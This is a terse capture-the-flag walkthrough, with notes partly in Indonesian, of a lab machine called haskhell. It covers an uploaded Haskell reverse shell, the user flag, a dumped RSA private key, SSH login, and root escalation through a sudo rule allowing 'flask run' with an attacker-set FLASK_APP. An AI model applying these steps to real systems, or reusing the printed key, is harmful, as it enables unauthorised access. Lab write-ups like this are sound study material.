```
Nmap -> port 5001 -> gob dapet dir /submit/ -> Masukin payload revshell .hs
```

```
flask@haskhell:/home/prof$ cd /home/prof/
flask@haskhell:/home/prof$ cat user.txt
flag{academic_dishonesty}

flask@haskhell:/home/prof$ cat .ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA068E6x8/vMcUcitx9zXoWsF8WjmBB04VgGklNQCSEHtzA9cr
94rYpUPcxxxYyw/dAii0W6srQuRCAbQxO5Di+tv9aWXmBGMEt0/3tOE7D09RhZGQ
b68lAFDjSSJaVlVzPi+waotyP2ccVJDjXkwK0KIm6RsACIOhM9GtI2wyZ6vOg4ss
Nb+7UY60iOkcOAWP09Omzjc2q7hcE6CuV6f7+iObamfGlZ4QQ5IvUj0etStDD6iU
WQX4vYewYqUz8bedccFvpC6uP2FGvDONYXrLWWua7wlwSgOqeXXxkG7fxVqYY2++
6ZVm8RE7TpPNxsQNDwpnxOiwTxGMgCrIMxgRVwIDAQABAoIBAQCTLXbf+wQXvtrq
XmaImQSKRUiuepjJeXLdqz1hUpo7t3lKTEqXfAQRM9PG5GCgHtFs9NwheCtGAOob
wSsR3TTTci0JIP4CQs4+nez96DNl+6IUmhawcDfrtlGwwZ/JsvPDYujnyziN+KTr
7ykGoRxL3tHq9Qja4posKzaUEGAjTz8NwrhzB6xatsmcWBV0fFoWzpS/xWzW3i7F
gAoYxc6+4s5bKHsJima2Aj5F3XtHfipkMdBvbl+sjGllgiQn/oEjYMIX5wc7+se2
o7FERO2oy3I5jUOlULsr9BwQpNFA2Qenc4Wc7ghb0LfCVaUs/RHQ7IQ4F3yp/G67
54oLue6hAoGBAPCe+WsnOXzhwQ9WXglhfztDR1lcwSFMeHZpcxYUVqmVEi2ZMLll
B67SCri9lHHyvBtrH7YmZO5Q9UcGXdLCZGmbkJUdX2bjqV0zwwx1qOiVY8LPnZSJ
LJN+0p1dRHsO3n4vTHO8mVuiM5THi6pcgzSTggIhS+e1ks7nlQKiBuD/AoGBAOE2
kwAMtvI03JlkjvOHsN5IhMbOXP0zaRSrKZArDCcqDojDL/AQltQkkLtQPdUPJgdY
3gOkUJ2BCHNlIsAtUjrTj+T76N512rO2sSidOEXRDCc+g/QwdgENiq/w9JroeWFc
g9qM3f2cl/EkjxRgiyuTfK6mbzcuMSveX4LfCXepAoGAd2MZc+4ZWvoUNUzwCY2D
eF8QVqlr9d6gYng9rvXWbfvV8iPxBfu3zSjQQwtlTQhYBu6m5FS2fXxTxrLE+J6U
/cU+/o19WWqaDPFy1IrIjOYagn1KvXk2UdR6IbQ2FyywfkFvmHk6Sjn3h9leVd/j
BcIunmnw5H214s0KpSzJZvcCgYA5Ca9VNeMnmIe+OZ+Swezjfw5Ro3YdkmWsnGTc
ZGqhiJ9Bt91uOWVZuSEGr53ZVgrVlYY0+eqI2WMghp60eUX4LBinb71cihCnrz9S
/+5+kCE51zVoJNXeEmXrhWUNzo7fP6UNNtwKHRzGL/IkwQa+NI5BVVmZahN9/sXF
yWMGcQKBgQDheyI7eKTDMsrEXwMUpl5aiwWPKJ0gY/2hS0WO3XGQtx6HBwg6jJKw
MMn8PNqYKF3DWex59PYiy5ZL1pUG2Y+iadGfIbStSZzN4nItF5+yC42Q2wlhtwgt
i4MU8bepL/GTMgaiR8RmU2qY7wRxfK2Yd+8+GDuzLPEoS7ONNjLhNA==
-----END RSA PRIVATE KEY-----

```

```
nano id_rsa
chmod 600 id_rsa
ssh -i id_rsa prof@IP

prof@haskhell:~$ sudo -l
Matching Defaults entries for prof on haskhell:
    env_reset, env_keep+=FLASK_APP, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User prof may run the following commands on haskhell:
    (root) NOPASSWD: /usr/bin/flask run

prof@haskhell:~$ nano rev.py
prof@haskhell:~$ export FLASK_APP=rev.py
prof@haskhell:~$ sudo -u root /usr/bin/flask run
# cd /root
# ls
root.txt
# cat root.txt
flag{im_purely_functional}
```